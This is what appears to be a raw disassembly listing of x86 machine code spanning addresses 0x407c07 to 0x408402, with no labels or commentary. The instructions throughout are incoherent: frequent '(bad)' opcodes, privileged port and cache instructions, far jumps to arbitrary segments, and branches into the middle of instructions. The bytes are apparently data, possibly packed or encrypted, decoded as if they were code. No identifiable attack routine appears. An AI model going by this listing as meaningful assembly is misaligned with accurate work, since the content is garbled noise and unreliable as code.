  407c07:	lods   eax,DWORD PTR ds:[esi]
  407c08:	in     eax,dx
  407c09:	shl    esp,0xeb
  407c0c:	xor    DWORD PTR ds:0x9ffb9068,ecx
  407c12:	fisubr DWORD PTR [esi+0x1b]
  407c15:	mov    al,0x47
  407c17:	das    
  407c18:	pop    es
  407c19:	adc    eax,0xbbe91e5
  407c1e:	pop    ebx
  407c1f:	sbb    eax,0xcfcf181c
  407c24:	sbb    eax,0xd2278559
  407c29:	(bad)  
  407c2a:	mov    ebx,0xf62243a8
  407c2f:	es push 0xffffff99
  407c32:	arpl   dx,dx
  407c34:	cdq    
  407c35:	sbb    al,0x94
  407c37:	dec    edx
  407c38:	jmp    0xa41b:0xc3c48343
  407c3f:	cli    
  407c40:	mov    ds:0xeb717085,al
  407c45:	mov    bl,0x52
  407c47:	icebp  
  407c48:	(bad)  
  407c49:	and    esp,esp
  407c4b:	popa   
  407c4c:	mov    ebp,0x96baca0c
  407c51:	ret    0xa867
  407c54:	es dec edx
  407c56:	ja     0x407c7d
  407c58:	mov    esp,0xb88fb672
  407c5d:	outs   dx,DWORD PTR ds:[esi]
  407c5e:	inc    esp
  407c5f:	out    dx,eax
  407c60:	cmp    DWORD PTR ss:[eax+eax*8],ebp
  407c64:	push   ss
  407c65:	std    
  407c66:	outs   dx,BYTE PTR ds:[esi]
  407c67:	ret    0x18b4
  407c6a:	stos   DWORD PTR es:[edi],eax
  407c6b:	add    eax,0xd3b35a4
  407c70:	icebp  
  407c71:	jae    0x407c11
  407c73:	cmp    DWORD PTR [ebp-0x58],edx
  407c76:	xor    DWORD PTR [edx+0x3e],esi
  407c79:	pop    ds
  407c7a:	mov    esi,0xecc4f8f0
  407c7f:	jl     0x407c91
  407c81:	cmp    cx,WORD PTR [edi-0x29785717]
  407c88:	sub    BYTE PTR [ebx+0xf],0x23
  407c8c:	and    ecx,DWORD PTR [eax+0x77bfb213]
  407c92:	fbstp  TBYTE PTR [eax+0x1672f9e3]
  407c98:	xor    eax,0xef6e7d9a
  407c9d:	popf   
  407c9e:	xor    BYTE PTR [ebp+0x28a6e1b8],cl
  407ca4:	sub    cl,bl
  407ca6:	out    0xb5,al
  407ca8:	or     bl,dh
  407caa:	adc    BYTE PTR [edx+0x29c59e6b],ah
  407cb0:	out    dx,al
  407cb1:	dec    ecx
  407cb2:	jecxz  0x407ce6
  407cb4:	and    esp,DWORD PTR [eax]
  407cb6:	stos   DWORD PTR es:[edi],eax
  407cb7:	or     al,0x8a
  407cb9:	or     al,0x36
  407cbb:	adc    dh,dl
  407cbd:	arpl   di,bp
  407cbf:	arpl   WORD PTR [edi-0x385e758d],bx
  407cc5:	fsubr  DWORD PTR [esi+ebx*2-0x30]
  407cc9:	aam    0x31
  407ccb:	pop    ds
  407ccc:	scas   eax,DWORD PTR es:[edi]
  407ccd:	xchg   BYTE PTR [ebp+0xc],ah
  407cd0:	jge    0x407c7b
  407cd2:	adc    DWORD PTR [esi+0x4b],0x75bbae33
  407cd9:	add    al,BYTE PTR [edi+0x125c5d9a]
  407cdf:	rcl    BYTE PTR [esi+0x283761aa],1
  407ce5:	sar    BYTE PTR [ebp-0x39],cl
  407ce8:	pop    ds
  407ce9:	aad    0x8a
  407ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cec:	int    0x1f
  407cee:	mov    bh,0x70
  407cf0:	mov    ds,WORD PTR ss:[ebp+0x5be129dd]
  407cf7:	dec    ecx
  407cf8:	push   ecx
  407cf9:	inc    esi
  407cfa:	mov    ecx,0x7651c15b
  407cff:	in     eax,0x6
  407d01:	mov    esi,0x233ecba0
  407d06:	rcr    DWORD PTR cs:[edx-0x20c35338],1
  407d0d:	jbe    0x407cce
  407d0f:	(bad)  
  407d10:	add    edx,DWORD PTR [edx+0x1176bdd4]
  407d16:	fimul  DWORD PTR [edi]
  407d18:	sub    eax,ebp
  407d1a:	push   edi
  407d1b:	ins    BYTE PTR es:[edi],dx
  407d1c:	cmp    BYTE PTR [ecx],dl
  407d1e:	fnstenv [eax-0x48]
  407d21:	imul   edi,DWORD PTR [ecx],0x46ba7b69
  407d27:	inc    esi
  407d28:	xor    BYTE PTR [edi],bl
  407d2a:	outs   dx,BYTE PTR ds:[esi]
  407d2b:	pop    ss
  407d2c:	add    BYTE PTR ds:0xe12c410,bh
  407d32:	clc    
  407d33:	push   0xffffffc3
  407d35:	mov    al,0xfc
  407d37:	dec    eax
  407d38:	test   al,0x68
  407d3a:	shl    BYTE PTR [ebx*2+0x2878d1cf],0x37
  407d42:	jp     0x407d8e
  407d44:	ret    
  407d45:	punpckhdq mm0,mm1
  407d48:	mov    ebx,0x929c7b6e
  407d4d:	and    al,0xe6
  407d4f:	mov    edi,edx
  407d51:	push   ds
  407d52:	clc    
  407d53:	mov    esp,0xb8005745
  407d58:	jl     0x407dab
  407d5a:	dec    esi
  407d5b:	xchg   ebp,eax
  407d5c:	imul   edx,DWORD PTR [ebx-0x1cb2711],0xf
  407d63:	mov    al,0x8c
  407d65:	inc    ecx
  407d66:	xor    al,0xfa
  407d68:	push   0x8dff1130
  407d6d:	ds icebp 
  407d6f:	xchg   DWORD PTR [eax+ebp*4-0xf],ebx
  407d73:	or     ecx,esp
  407d75:	sahf   
  407d76:	leave  
  407d77:	and    DWORD PTR [ebx-0xb915c68],edi
  407d7d:	and    al,0x86
  407d7f:	jno    0x407d81
  407d81:	push   edi
  407d82:	aam    0xb3
  407d84:	or     bl,BYTE PTR [ebp+eiz*1+0x48]
  407d88:	fmul   st(6),st
  407d8a:	push   edi
  407d8b:	aad    0xd5
  407d8d:	aaa    
  407d8e:	fistp  DWORD PTR [esi+ecx*4-0x6982bc2a]
  407d95:	add    BYTE PTR [edi],cl
  407d97:	push   ecx
  407d98:	xchg   edx,eax
  407d99:	push   ss
  407d9a:	(bad)  
  407d9b:	and    BYTE PTR [ecx],ah
  407d9d:	int3   
  407d9e:	inc    esp
  407d9f:	adc    esi,DWORD PTR [edi+0x7044e1e7]
  407da5:	inc    ebx
  407da6:	mov    edx,0xbe33db67
  407dab:	sbb    ah,BYTE PTR [ebx+0x16]
  407dae:	sbb    edx,DWORD PTR [esi+edx*2]
  407db1:	cmp    edi,DWORD PTR [edx-0x1b]
  407db4:	das    
  407db5:	pop    ecx
  407db6:	xor    ebp,0xffffffa1
  407db9:	mov    ebx,0xf220bfc7
  407dbe:	pop    ss
  407dbf:	cmc    
  407dc0:	xchg   esi,eax
  407dc1:	sub    dl,BYTE PTR [ecx]
  407dc3:	push   es
  407dc4:	mov    BYTE PTR [eax+0x4a3cbe9e],al
  407dca:	imul   edi,ebx,0x16d4fb69
  407dd0:	push   edi
  407dd1:	dec    eax
  407dd2:	imul   ebx
  407dd4:	test   DWORD PTR ds:0x40430982,edi
  407dda:	into   
  407ddb:	add    al,0x47
  407ddd:	jmp    DWORD PTR [edx]
  407ddf:	dec    edi
  407de0:	mov    dl,0xc2
  407de2:	pushf  
  407de3:	cmc    
  407de4:	push   cs
  407de5:	mov    dl,0xff
  407de7:	or     eax,0xc6fd2ff2
  407dec:	mov    ecx,0xeb28ffb9
  407df1:	xor    BYTE PTR [edi-0x47],dl
  407df4:	pusha  
  407df5:	mov    edi,0x68eb5e28
  407dfa:	mov    edx,0x607ab2d0
  407dff:	mov    esp,0x8c5f33df
  407e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e05:	adc    eax,0x31740f2f
  407e0a:	test   BYTE PTR [ebx+0xc8c2c34],dl
  407e10:	outs   dx,DWORD PTR ds:[esi]
  407e11:	dec    eax
  407e12:	aad    0x5c
  407e14:	pop    ecx
  407e15:	fisub  DWORD PTR [edx+0x7b]
  407e18:	(bad)  
  407e19:	fst    st(6)
  407e1b:	fldcw  WORD PTR [edi-0x34]
  407e1e:	push   es
  407e1f:	mov    eax,0x2ed3935e
  407e24:	fstp   DWORD PTR [edi-0x7e]
  407e27:	arpl   cx,cx
  407e29:	dec    ecx
  407e2a:	(bad)  
  407e2c:	loop   0x407e8f
  407e2e:	pop    eax
  407e2f:	mov    edi,0x7dc39bff
  407e34:	test   BYTE PTR [ebx],bh
  407e36:	jl     0x407e9e
  407e38:	cdq    
  407e39:	stos   DWORD PTR es:[edi],eax
  407e3a:	inc    esp
  407e3b:	rcl    BYTE PTR [ecx+0x1fe801a7],1
  407e41:	sbb    eax,0x5ff18bb2
  407e46:	dec    ecx
  407e47:	jmp    0x2d35:0xe7b6a3d9
  407e4e:	pop    ebp
  407e4f:	iretw  
  407e51:	dec    edx
  407e52:	sahf   
  407e53:	pop    esp
  407e54:	lods   eax,DWORD PTR ds:[esi]
  407e55:	sti    
  407e56:	mov    dh,0xd4
  407e58:	or     DWORD PTR [ecx-0x44],0x73
  407e5c:	call   0x2926:0xd3f88139
  407e63:	inc    esi
  407e64:	fwait
  407e65:	mov    WORD PTR [edx],gs
  407e67:	stc    
  407e68:	and    bh,BYTE PTR cs:[edx+0x5d]
  407e6c:	into   
  407e6d:	mov    ah,0x55
  407e6f:	xchg   ebp,eax
  407e70:	mov    ah,0xe7
  407e72:	pop    esp
  407e73:	push   ebp
  407e74:	xchg   edx,eax
  407e75:	and    al,0xec
  407e78:	add    eax,0x392312d5
  407e7d:	dec    ecx
  407e7e:	push   0xccaac01e
  407e83:	push   0x6d
  407e85:	cs test eax,0x6dd5deb8
  407e8b:	neg    dl
  407e8d:	xor    al,0x28
  407e8f:	aam    0x3f
  407e91:	jnp    0x407e83
  407e93:	inc    edi
  407e94:	mov    dh,0x22
  407e96:	push   cs
  407e97:	pusha  
  407e98:	sbb    esi,DWORD PTR [ebx+0x4102aa4]
  407e9e:	jb     0x407e77
  407ea0:	jae    0x407ef7
  407ea2:	jl     0x407e64
  407ea4:	fcomip st,st(0)
  407ea6:	push   eax
  407ea7:	cli    
  407ea8:	ss into 
  407eaa:	je     0x407e41
  407eac:	outs   dx,DWORD PTR ds:[esi]
  407ead:	jmp    0x72a6:0xc625b612
  407eb4:	imul   edx,DWORD PTR [edi-0x13],0xffffffa1
  407eb8:	scas   eax,DWORD PTR es:[edi]
  407eb9:	mov    bh,0x52
  407ebb:	shl    DWORD PTR [esi-0x5701c099],cl
  407ec1:	pop    ecx
  407ec2:	push   esi
  407ec3:	xchg   edx,eax
  407ec4:	(bad)  
  407ec5:	loopne 0x407f1d
  407ec7:	or     al,0x78
  407ec9:	(bad)  
  407eca:	mov    ds:0x55458871,al
  407ecf:	cmp    ebp,DWORD PTR [esi+0x31]
  407ed2:	mov    al,0x5c
  407ed4:	inc    ecx
  407ed5:	into   
  407ed6:	ds sbb al,0x8c
  407ed9:	cmp    eax,0xdd472815
  407ede:	sbb    bh,ah
  407ee0:	inc    edx
  407ee1:	mov    BYTE PTR [edx-0x42],ch
  407ee4:	into   
  407ee5:	pop    edx
  407ee6:	push   ds
  407ee7:	pop    ebp
  407ee8:	call   0x5f91218c
  407eed:	xchg   BYTE PTR [ebp+0x5a],cl
  407ef0:	inc    dl
  407ef2:	push   dx
  407ef4:	cmp    esp,0xe884340c
  407efa:	mov    eax,0xf620084a
  407eff:	jle    0x407f6f
  407f01:	mov    esp,0x2e750965
  407f06:	mov    ah,0xae
  407f08:	ja     0x407e8b
  407f0a:	push   esi
  407f0b:	sbb    esi,ecx
  407f0d:	cwde   
  407f0e:	and    al,BYTE PTR [edx-0x4]
  407f11:	push   ds
  407f12:	jle    0x407f58
  407f14:	or     esp,ebx
  407f16:	adc    edx,0x9
  407f19:	jne    0x407ed2
  407f1b:	hlt    
  407f1c:	adc    al,0xe2
  407f1e:	(bad)  
  407f1f:	or     eax,0x272c5b05
  407f24:	les    eax,FWORD PTR [edi+ebx*2]
  407f27:	dec    eax
  407f28:	jb     0x407f61
  407f2a:	enter  0x26fd,0x4f
  407f2e:	scas   eax,DWORD PTR es:[edi]
  407f2f:	inc    eax
  407f30:	inc    ebp
  407f31:	aam    0x64
  407f33:	aaa    
  407f34:	fstp   TBYTE PTR [edi]
  407f36:	fs mov esp,0xbf5a01ed
  407f3c:	jo     0x407f9b
  407f3e:	aad    0x68
  407f40:	adc    esi,esi
  407f42:	mov    dl,BYTE PTR [si]
  407f45:	sbb    ah,BYTE PTR [edi+0xd27ebce]
  407f4b:	push   edx
  407f4c:	mov    ch,BYTE PTR [esi+ebx*2+0x70]
  407f50:	pcmpeqw mm0,QWORD PTR [eax-0x6e]
  407f54:	scas   al,BYTE PTR es:[edi]
  407f55:	push   ds
  407f56:	in     al,dx
  407f57:	out    dx,al
  407f58:	adc    DWORD PTR [ebp-0x40],0x5b
  407f5c:	sub    esp,DWORD PTR [eax]
  407f5e:	sar    DWORD PTR [edi],0xf3
  407f61:	push   edx
  407f62:	call   0x2bbb:0xd886f809
  407f69:	adc    BYTE PTR [ebp+0x5cf5710b],ch
  407f6f:	push   edx
  407f70:	cmc    
  407f71:	xor    bl,BYTE PTR [edx-0x2b]
  407f74:	clc    
  407f75:	cmp    eax,0xb186d876
  407f7a:	loop   0x407ffa
  407f7c:	ins    BYTE PTR es:[edi],dx
  407f7d:	rcr    BYTE PTR [edx],1
  407f7f:	js     0x407fd0
  407f81:	sbb    al,BYTE PTR [edx-0x7c42af9e]
  407f87:	push   eax
  407f88:	fdivp  st(3),st
  407f8a:	out    dx,eax
  407f8b:	aam    0x8b
  407f8d:	sbb    BYTE PTR [ebx],cl
  407f8f:	dec    edx
  407f90:	scas   al,BYTE PTR es:[edi]
  407f91:	adc    al,0x21
  407f93:	sbb    DWORD PTR [ebp+edx*8+0x6d],edi
  407f97:	add    BYTE PTR [ebx],ah
  407f99:	sub    al,0x62
  407f9b:	jns    0x407fbd
  407f9d:	jo     0x407ff4
  407f9f:	cmp    eax,0xdde162e3
  407fa4:	push   0x6b
  407fa6:	sub    ah,ch
  407fa8:	js     0x407f83
  407faa:	mov    ds:0xbe98bffc,eax
  407faf:	jp     0x407fd6
  407fb1:	rol    BYTE PTR [edx-0x2cb935d5],0x3b
  407fb8:	popf   
  407fb9:	inc    edi
  407fba:	mov    DWORD PTR [esi+0x27ed91b3],edx
  407fc0:	xor    eax,0x57d8d66e
  407fc5:	into   
  407fc6:	mov    dl,0x75
  407fc8:	jp     0x408023
  407fca:	aas    
  407fcb:	jl     0x407fe6
  407fcd:	adc    DWORD PTR ds:0x91955493,edi
  407fd3:	push   edi
  407fd4:	lds    ebp,FWORD PTR [edi+0x7c1f5cfe]
  407fda:	out    0x6a,eax
  407fdc:	rol    DWORD PTR [ecx+0x57],1
  407fdf:	ja     0x407f93
  407fe1:	mov    edi,0x87e0d601
  407fe6:	or     ebx,DWORD PTR [edi+0x3f]
  407fe9:	fmul   DWORD PTR [edx]
  407feb:	inc    esp
  407fec:	push   edi
  407fed:	dec    ecx
  407fee:	iret   
  407fef:	push   ecx
  407ff0:	xor    ch,BYTE PTR [ebp+0xb]
  407ff3:	push   edi
  407ff4:	bound  esp,QWORD PTR fs:[esi+0x3d74c037]
  407ffb:	push   es
  407ffc:	jae    0x408025
  407ffe:	enter  0x6911,0x7b
  408002:	fwait
  408003:	les    esi,FWORD PTR [ecx]
  408005:	cmc    
  408006:	enter  0x8d30,0xa1
  40800a:	hlt    
  40800b:	jmp    0xd956c931
  408010:	ret    0xb862
  408013:	adc    DWORD PTR [edi],ecx
  408015:	adc    BYTE PTR [ebp+0x69d14744],ch
  40801b:	std    
  40801c:	loope  0x408037
  40801e:	jp     0x408074
  408020:	jo     0x408060
  408022:	sbb    DWORD PTR [edx-0x4ed1f763],ebx
  408028:	xchg   edi,eax
  408029:	inc    eax
  40802a:	rcr    BYTE PTR cs:[esi],1
  40802d:	jb     0x408021
  40802f:	mov    eax,ds:0x7da98a5e
  408034:	inc    edi
  408035:	test   BYTE PTR [eax],ah
  408037:	push   ecx
  408038:	call   0x85a4:0xbc0ee2da
  40803f:	dec    ebx
  408040:	push   edi
  408041:	pop    ecx
  408042:	cdq    
  408043:	shl    ebx,cl
  408045:	(bad)  
  408046:	push   edi
  408047:	loopne 0x408011
  408049:	add    eax,0x1e8485de
  40804e:	ja     0x408044
  408050:	or     eax,0xac06a6a2
  408055:	cmc    
  408056:	pushf  
  408057:	mov    al,ds:0xdf9a3b72
  40805c:	repz push eax
  40805e:	fnstsw WORD PTR ds:0xb4120594
  408064:	js     0x40802a
  408066:	dec    ebp
  408067:	jae    0x4080e7
  408069:	clc    
  40806a:	xor    al,0x79
  40806c:	push   es
  40806d:	bound  ebx,QWORD PTR [edi-0x384ba455]
  408073:	jae    0x408054
  408075:	fs ins DWORD PTR es:[edi],dx
  408077:	cmc    
  408078:	(bad)  
  408079:	in     al,dx
  40807a:	repnz add DWORD PTR [edx-0x44a87321],0x12731106
  408085:	cwde   
  408086:	mov    dl,0xaf
  408088:	fs out 0xde,eax
  40808b:	xchg   BYTE PTR [edx],dh
  40808d:	mov    BYTE PTR [edx],bh
  40808f:	dec    edi
  408090:	and    ch,BYTE PTR [edi]
  408092:	stos   DWORD PTR es:[edi],eax
  408093:	inc    edi
  408094:	jo     0x4080f0
  408096:	xchg   DWORD PTR [ebp+0x7c],edx
  408099:	inc    esp
  40809a:	in     al,dx
  40809b:	scas   al,BYTE PTR es:[edi]
  40809c:	fcom   DWORD PTR [ecx-0x2942b2ce]
  4080a2:	dec    ebp
  4080a3:	sbb    DWORD PTR [edi+esi*4],edx
  4080a6:	and    ah,BYTE PTR [ebx-0x9]
  4080a9:	mov    eax,0xcdc9c22
  4080ae:	adc    al,0xc0
  4080b0:	dec    sp
  4080b2:	cmp    al,0xb
  4080b4:	loopne 0x408082
  4080b6:	adc    al,0xb2
  4080b8:	add    ecx,DWORD PTR [ebx]
  4080ba:	push   edx
  4080bb:	in     eax,dx
  4080bc:	xchg   esi,eax
  4080bd:	lods   eax,DWORD PTR ds:[esi]
  4080be:	inc    ebp
  4080bf:	arpl   WORD PTR ds:0x1ffa892c,bx
  4080c5:	fistp  WORD PTR [ecx-0x1f897001]
  4080cb:	jge    0x408062
  4080cd:	xchg   edi,eax
  4080ce:	sub    DWORD PTR [edx+0x7b3cb039],ecx
  4080d4:	addr16 xchg ecx,eax
  4080d6:	ja     0x40809f
  4080d8:	or     DWORD PTR [ecx-0x26a3cde2],esi
  4080de:	mov    ds:0x684942c7,eax
  4080e3:	stos   DWORD PTR es:[edi],eax
  4080e4:	enter  0x31f3,0xe3
  4080e8:	div    DWORD PTR [ebx]
  4080ea:	sub    ax,0x66b9
  4080ee:	cdq    
  4080ef:	sti    
  4080f0:	or     ebx,DWORD PTR [eax+0x1c]
  4080f3:	or     ebx,DWORD PTR [edx-0x30]
  4080f6:	mov    edi,0xc5c3ff6f
  4080fb:	push   ecx
  4080fc:	cmp    BYTE PTR [eax+eiz*1-0x454783fe],bl
  408103:	pop    ds
  408104:	leave  
  408105:	scas   al,BYTE PTR es:[edi]
  408106:	xchg   edi,eax
  408107:	shr    BYTE PTR [ecx+0x2763ad48],cl
  40810d:	clc    
  40810e:	inc    esp
  40810f:	inc    esi
  408110:	(bad)  
  408112:	jmp    0x154acdd3
  408117:	mov    WORD PTR [eax*1-0x7e1ef72c],?
  40811e:	and    bh,BYTE PTR [edx+ebx*8+0x69e2244f]
  408125:	enter  0x987e,0xb8
  408129:	test   eax,0xf4e7302f
  40812e:	inc    ebp
  40812f:	add    eax,0x46f8e281
  408134:	pop    ebp
  408135:	xor    al,0x96
  408137:	aad    0x72
  408139:	pushf  
  40813a:	cli    
  40813b:	push   0x63f587bb
  408140:	mov    edx,0xd751d674
  408145:	std    
  408146:	les    ebp,FWORD PTR ds:[ebx-0x786ff22b]
  40814d:	xchg   esp,eax
  40814e:	pop    edx
  40814f:	pop    edx
  408150:	add    al,0x43
  408152:	aaa    
  408153:	jno    0x408119
  408155:	cwde   
  408156:	(bad)  
  408157:	repnz std 
  408159:	and    DWORD PTR [ebx],ebx
  40815b:	sub    al,0xeb
  40815d:	int3   
  40815e:	mov    eax,ds:0x9813bfa1
  408163:	mov    esp,0xcd8bfeb
  408168:	mov    ebp,0x70d755cd
  40816d:	stos   BYTE PTR es:[edi],al
  40816e:	adc    ebx,DWORD PTR [edi+0x75461792]
  408174:	push   esi
  408175:	gs stos DWORD PTR es:[edi],eax
  408177:	les    eax,FWORD PTR ds:0x861e98ea
  40817d:	sbb    BYTE PTR [esi-0x5a],dh
  408180:	jg     0x40815c
  408182:	sbb    esi,DWORD PTR [ecx]
  408184:	sbb    ebp,DWORD PTR [ebx-0x2305cc4e]
  40818a:	mov    ds:0x57f7d5e6,al
  40818f:	lds    esi,FWORD PTR [esi]
  408191:	mov    edx,0xd2019b41
  408196:	in     al,dx
  408197:	add    DWORD PTR [ebx],0x4f9649d8
  40819d:	in     eax,dx
  40819e:	push   cs
  40819f:	out    dx,eax
  4081a0:	call   0x8ecba7a7
  4081a5:	cmc    
  4081a6:	ins    BYTE PTR es:[edi],dx
  4081a7:	pop    ds
  4081a8:	clc    
  4081a9:	xchg   edx,eax
  4081aa:	shl    BYTE PTR [ecx],0xc
  4081ad:	loopne 0x408169
  4081af:	add    DWORD PTR [esi-0x7d5b7af1],ecx
  4081b5:	clc    
  4081b6:	mov    WORD PTR [ecx-0x6e2dbad0],es
  4081bc:	lahf   
  4081bd:	jmp    0x31d782c8
  4081c2:	(bad)  
  4081c3:	cwde   
  4081c4:	inc    ebp
  4081c5:	cdq    
  4081c6:	and    BYTE PTR [eax],bl
  4081c8:	cld    
  4081c9:	and    DWORD PTR [ebx-0x6704f83b],ebx
  4081cf:	icebp  
  4081d0:	cmp    eax,0xd6c9aeb
  4081d5:	pop    es
  4081d6:	bound  ebp,QWORD PTR [ebx]
  4081d8:	shl    DWORD PTR [edi+edx*8-0x1e2c353c],cl
  4081df:	push   0x44
  4081e1:	daa    
  4081e2:	cmc    
  4081e3:	das    
  4081e4:	cdq    
  4081e5:	retf   
  4081e6:	lahf   
  4081e7:	add    ecx,DWORD PTR [edi+0x661489f9]
  4081ed:	mov    ch,0x35
  4081ef:	adc    eax,0x2af1b200
  4081f4:	push   ecx
  4081f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081f6:	jno    0x40822a
  4081f8:	jmp    DWORD PTR [esi+ecx*2]
  4081fb:	adc    DWORD PTR [ebp-0x1e08936a],edx
  408201:	std    
  408202:	shl    DWORD PTR [eax-0x47d504ea],0x52
  408209:	or     DWORD PTR [eax-0x5949621],esp
  40820f:	jno    0x40828a
  408211:	push   ss
  408212:	retf   0x89ec
  408215:	mov    ecx,0xc0128532
  40821a:	sub    BYTE PTR [edi+0x7b],ch
  40821d:	jge    0x40828b
  40821f:	shl    BYTE PTR [ecx+0x1],0xed
  408223:	hlt    
  408224:	xor    DWORD PTR [eax-0x405c8908],0x5f
  40822b:	inc    ecx
  40822c:	fbld   TBYTE PTR [ecx-0x79]
  40822f:	inc    ebp
  408230:	push   ebx
  408231:	out    dx,al
  408232:	xchg   DWORD PTR [ebx+0x76940b3b],esp
  408238:	jge    0x4081d0
  40823a:	sbb    ebp,ecx
  40823c:	popf   
  40823d:	mov    DWORD PTR [edi-0x7eac43aa],ecx
  408243:	idiv   DWORD PTR cs:[esp+esi*1-0x53]
  408248:	pop    edx
  408249:	sbb    BYTE PTR [edi+0x3683b67c],dl
  40824f:	psubb  mm4,QWORD PTR [edi]
  408252:	jo     0x4081eb
  408254:	adc    eax,0x3d2a093e
  408259:	ja     0x4082aa
  40825b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40825c:	fcmovnu st,st(4)
  40825e:	(bad)  
  40825f:	cmp    ebp,edi
  408261:	mov    ecx,0x797a34b1
  408266:	mov    dh,0x7b
  408268:	push   edi
  408269:	push   cs
  40826a:	jecxz  0x40825b
  40826c:	pop    ebx
  40826d:	mov    dh,BYTE PTR ds:[esi+0x32540f6a]
  408274:	test   ah,bl
  408276:	or     ah,dh
  408278:	inc    ecx
  408279:	shl    DWORD PTR [ebp-0xa5cbac7],1
  40827f:	wbinvd 
  408281:	sub    DWORD PTR [eax-0x682830b],esp
  408287:	(bad)  
  408288:	pop    ebp
  408289:	dec    edi
  40828a:	inc    esp
  40828b:	mov    ah,BYTE PTR [esi+0x7e]
  40828e:	dec    esp
  40828f:	mov    bl,0xb0
  408291:	jle    0x4082bd
  408293:	mov    bh,0x22
  408295:	or     dh,BYTE PTR [edx+0x3659853e]
  40829b:	add    esp,DWORD PTR [ecx]
  40829d:	xchg   edi,eax
  40829e:	or     DWORD PTR ds:0x4322498a,eax
  4082a4:	add    bl,BYTE PTR [esi+0x1a69e7f7]
  4082aa:	push   eax
  4082ab:	xchg   esi,eax
  4082ac:	add    eax,0x6cc786e6
  4082b1:	nop
  4082b2:	cmc    
  4082b3:	cmp    eax,0x33c0fa10
  4082b8:	push   es
  4082b9:	or     al,0xde
  4082bb:	xchg   edi,eax
  4082bc:	inc    eax
  4082bd:	jo     0x408313
  4082bf:	and    esp,0x37ba5ab
  4082c5:	or     eax,0xadab5631
  4082ca:	outs   dx,BYTE PTR ds:[esi]
  4082cb:	sbb    DWORD PTR [ecx-0x2f],eax
  4082ce:	pop    esi
  4082cf:	sbb    eax,0x58dde938
  4082d4:	call   FWORD PTR [edx+0x31e70423]
  4082da:	cmc    
  4082db:	test   DWORD PTR [ecx-0x59],0xd7fe5811
  4082e2:	push   ebx
  4082e3:	or     eax,DWORD PTR [edx+0x47b5f69]
  4082e9:	lods   al,BYTE PTR ds:[esi]
  4082ea:	xchg   esi,eax
  4082eb:	and    eax,0xb276224
  4082f0:	aam    0xce
  4082f2:	jbe    0x40830d
  4082f4:	push   edi
  4082f5:	fcom   DWORD PTR [ebp-0x50dc9101]
  4082fb:	and    DWORD PTR [edi],ebx
  4082fd:	jnp    0x4082d7
  4082ff:	sub    al,0xbf
  408301:	inc    ebx
  408302:	aaa    
  408303:	jp     0x408287
  408305:	int3   
  408306:	xchg   edx,eax
  408307:	sahf   
  408308:	and    eax,0x2cf12f0a
  40830d:	aaa    
  40830e:	fistp  DWORD PTR [eax+0x21]
  408311:	retf   
  408312:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408314:	pushf  
  408315:	add    ecx,DWORD PTR [edx+eax*1-0x38]
  408319:	ret    0x64d5
  40831c:	and    edi,edi
  40831e:	out    0xa4,al
  408320:	hlt    
  408321:	stos   DWORD PTR es:[edi],eax
  408322:	jg     0x4082ea
  408324:	inc    ebp
  408325:	pop    DWORD PTR [ebx+0x238a8bb1]
  40832b:	mov    ah,0xd9
  40832d:	ins    BYTE PTR es:[edi],dx
  40832e:	push   edi
  40832f:	add    DWORD PTR [edx-0x4a073659],edi
  408335:	sub    edx,DWORD PTR [ebx-0x5e30e42e]
  40833b:	or     al,0x95
  40833d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40833e:	cld    
  40833f:	test   al,0x39
  408341:	pop    ebp
  408342:	xchg   ecx,eax
  408343:	push   eax
  408344:	jns    0x4082dd
  408346:	rdmsr  
  408348:	rcl    eax,1
  40834a:	sub    eax,DWORD PTR [ebx-0x17fe6bbc]
  408350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408351:	add    al,0x55
  408354:	mov    al,0x53
  408356:	xchg   ebp,eax
  408357:	sub    al,0xa5
  408359:	jmp    FWORD PTR [ebp+0x67]
  40835c:	pusha  
  40835d:	jmp    0x89b809a3
  408362:	(bad)  
  408363:	int3   
  408364:	or     ebx,DWORD PTR [ebx]
  408366:	push   cs
  408367:	sbb    ecx,edi
  408369:	pop    ebx
  40836a:	into   
  40836b:	pop    esp
  40836c:	pop    ds
  40836d:	cmp    al,0x2c
  40836f:	jl     0x40833e
  408371:	js     0x4083e9
  408373:	popa   
  408374:	test   BYTE PTR ss:[esi-0x73a94707],bh
  40837b:	cwde   
  40837c:	mov    ebx,0xfb415fd4
  408381:	cs xchg ebx,eax
  408383:	arpl   WORD PTR [ebp-0x11a70bd2],cx
  408389:	mov    edi,DWORD PTR [ebx]
  40838b:	and    eax,0x35f187ba
  408390:	dec    ebx
  408391:	mov    DWORD PTR [ebp+0x57],esp
  408394:	cdq    
  408395:	jmp    0x2700:0xdcc975c5
  40839c:	jne    0x40841c
  40839e:	rcl    DWORD PTR [ebx],0xdd
  4083a1:	sbb    dx,WORD PTR fs:[ebx]
  4083a5:	sbb    al,0x49
  4083a7:	retf   0xf2e3
  4083aa:	test   al,0xad
  4083ac:	xchg   edi,eax
  4083ad:	jae    0x4083f2
  4083af:	mov    edx,esp
  4083b1:	std    
  4083b2:	cmp    ah,BYTE PTR [eax+eiz*2-0x47]
  4083b6:	aaa    
  4083b7:	mov    bh,0x6a
  4083b9:	xchg   edi,eax
  4083ba:	popa   
  4083bb:	jae    0x4083bf
  4083bd:	mov    ecx,0x1a77182c
  4083c2:	fild   QWORD PTR ds:0x5c69ab4
  4083c8:	push   esp
  4083c9:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4083cb:	mov    esi,0x485c4213
  4083d0:	and    BYTE PTR [ebp+0x27d3cfaf],dh
  4083d6:	xchg   ebx,eax
  4083d7:	adc    DWORD PTR [edi+0x7ce9add6],esi
  4083dd:	adc    ebx,edi
  4083df:	sub    al,0xf5
  4083e1:	push   cs
  4083e2:	push   eax
  4083e3:	imul   ecx,DWORD PTR [eax+0x33809c7a],0x70fc86a0
  4083ed:	jmp    0x48f0995a
  4083f2:	(bad)  [ebx]
  4083f4:	ja     0x4083b4
  4083f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083f7:	push   ss
  4083f8:	(bad)  
  4083f9:	add    eax,esi
  4083fb:	push   ebp
  4083fc:	fprem1 
  4083fe:	adc    BYTE PTR [edx],cl
  408400:	dec    DWORD PTR [edi]
  408402:	hlt    
